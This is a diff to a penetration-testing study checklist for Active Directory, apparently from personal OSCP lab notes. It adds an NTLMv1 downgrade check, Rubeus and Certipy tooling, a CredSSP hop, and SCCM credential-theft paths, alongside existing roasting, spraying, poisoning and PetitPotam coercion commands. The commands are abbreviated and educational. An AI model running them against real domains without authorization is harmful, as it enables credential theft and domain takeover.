@@ -1,11 +1,12 @@
 +++
 title = 'Active Directory Checklist'
+description = 'Phase-by-phase Active Directory checklist: unauthenticated recon, credential acquisition, BloodHound, ACL abuse, delegation, coercion and relay, ADCS ESC chains, and trusts.'
 date = 2026-10-30
 type = 'notes'
 weight = 80
 toc = true
 task = true
-tags = ['active-directory', 'checklist']
+tags = ['active-directory', 'privilege-escalation', 'checklist']
 +++
 
 > Working document — tick as you go. Commands are abbreviated; full detail is in the matching AD section of the notes.
@@ -47,6 +48,7 @@ tags = ['active-directory', 'checklist']
 - [ ] **Username enumeration** — `kerbrute userenum -d <domain> --dc <DC> users.txt`
 - [ ] **AS-REP Roasting** — `impacket-GetNPUsers <domain>/ -dc-ip <DC> -usersfile users.txt -request`
 - [ ] **Password policy** — `nxc smb <DC> -u '' -p '' --pass-pol`; watch for PSOs
+- [ ] **NTLMv1 still enabled?** `nxc smb <DC> -u '' -p '' -M ntlmv1` — if LMCompatibilityLevel < 3, captured NetNTLM can be downgraded and cracked instantly
 - [ ] **Password spraying** — SpearSpray / `nxc` with **one password per pass**, respecting lockout
 - [ ] **LLMNR/NBT-NS/mDNS poisoning** — `responder -I eth0 -dwPv`
 - [ ] **mitm6** — IPv6 DHCPv6 takeover (`mitm6 -d <domain>`)
@@ -89,6 +91,8 @@ tags = ['active-directory', 'checklist']
 - [ ] Enumerate **shares** — `nxc smb <DC> -u <user> -p '<pass>' --shares`, `smbmap`
 - [ ] Enumerate **logged-on users** — `nxc smb <subnet> --loggedon-users`
 - [ ] Enumerate **domain users with SPN** — `impacket-GetUserSPNs <domain>/<user>:<pass> -request`
+- [ ] **Toolkit:** PowerView (`Find-InterestingDomainAcl`, `Get-DomainObjectAcl`), Rubeus (`kerberoast`, `asreproast`, `s4u`, `monitor`), Certipy (`find`, `req`, `auth`, `shadow`)
+- [ ] **CredSSP / double-hop:** `nxc winrm <host> -u <user> -p '<pass>' --credssp` — the delegated credential reaches the next hop when plain WinRM fails
 
 ---
 
@@ -237,6 +241,12 @@ Check each edge from Phase 3 against the abuse primitive:
 - [ ] `python3 PetitPotam.py <attacker-ip> <DC-IP>` (or `-u user -p pass`)
 - [ ] Chain into relay: Phase 6
 
+**SCCM (if a site server is in scope)**
+
+- [ ] `nxc smb <subnet> -M sccm` / `sccmhunter find` — site server, distribution point, and network access accounts
+- [ ] Read the NAA / client push credentials from the site database, or relay the site server's machine account
+- [ ] `SharpSCCM` / `sccmhunter` for the credential and takeover paths — usually a straight line to DA
+
 ---
 
 ## Phase 9 — DCSync and Persistence
@@ -291,15 +301,17 @@ Check each edge from Phase 3 against the abuse primitive:
 
 | Phase | Note |
 |---|---|
-| Phase 1 — Unauthenticated | **Initial Access** |
-| Phase 3 — Authenticated Enumeration | **Internal Enumeration & Lateral Movement** |
-| Phase 4 — ACL Abuse | **Internal Enumeration & Lateral Movement → ACL Enumeration & Abuse** |
-| Phase 5 — Delegation & RBCD | **Kerberos Delegation** |
-| Phase 6 — Coercion & Relay | **NTLM Relay** |
-| Phase 7 — ADCS | **ADCS Attacks** |
-| Phase 8 — Known Exploits | **Privilege Escalation to DA using Known Exploits** |
-| Phase 9 — DCSync & Persistence | **Internal Enumeration & Lateral Movement → DCSync** |
-| Phase 10 — Trusts | **Domain Trusts** |
+| Phase 1 — Unauthenticated | [Initial access](/notes/active-directory/initial-access/) |
+| Phase 3 — Authenticated enumeration | [Internal enumeration and lateral movement](/notes/active-directory/internal-enumeration-and-lateral-movement/) |
+| Phase 4 — ACL abuse | [Internal enumeration and lateral movement](/notes/active-directory/internal-enumeration-and-lateral-movement/#6-acl-enumeration-and-abuse) |
+| Phase 5 — Delegation and RBCD | [Kerberos delegation](/notes/active-directory/kerberos-delegation/) |
+| Phase 6 — Coercion and relay | [NTLM relay](/notes/active-directory/ntlm-relay/) |
+| Phase 7 — ADCS | [ADCS attacks](/notes/active-directory/adcs-attacks/) |
+| Phase 8 — Known exploits | [Privilege escalation to DA](/notes/active-directory/privilege-escalation-to-domain-admin-using-known-exploits/) |
+| Phase 9 — DCSync and persistence | [Internal enumeration and lateral movement](/notes/active-directory/internal-enumeration-and-lateral-movement/) |
+| Phase 10 — Trusts | [Domain trusts](/notes/active-directory/domain-trusts/) |
+
+For the same technique described without a lab frame, use the [OSCP command checklist](/notes/oscp-labs/commands/); for the boxes where a phase decided the outcome, use the [pattern library](/notes/oscp-labs/patterns/).
 
 
 A few notes on the structure:
